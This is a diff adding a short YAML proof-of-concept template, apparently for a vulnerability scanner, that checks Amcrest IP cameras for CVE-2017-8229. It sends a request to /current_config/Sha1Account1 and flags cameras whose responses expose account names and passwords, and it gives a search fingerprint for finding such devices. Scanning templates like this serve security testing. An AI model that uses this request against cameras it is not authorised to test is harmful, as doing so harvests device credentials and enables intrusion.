@@ -1,0 +1,17 @@
+id: poc-yaml-amcrest-current-config-info-leak
+info:
+  name: Amcrest IP Camera Web Sha1Account1 账号密码泄漏漏洞 CVE-2017-8229
+  severity: medium
+  tags:
+  - CVE-2017-8229
+  - 两高一弱
+  - 信息泄露
+  finger: ipm-721s
+  fofa: Amcrest
+requests:
+- method: GET
+  path: /current_config/Sha1Account1
+  expression: "status_code == 200 && \ncontains(body,\"\\\"Name\\\"\") &&\ncontains(body,\"\
+    \\\"AuthorityList\\\"\") &&\ncontains(body,\"\\\"Password\\\"\")\n"
+variables: {}
+transport: http
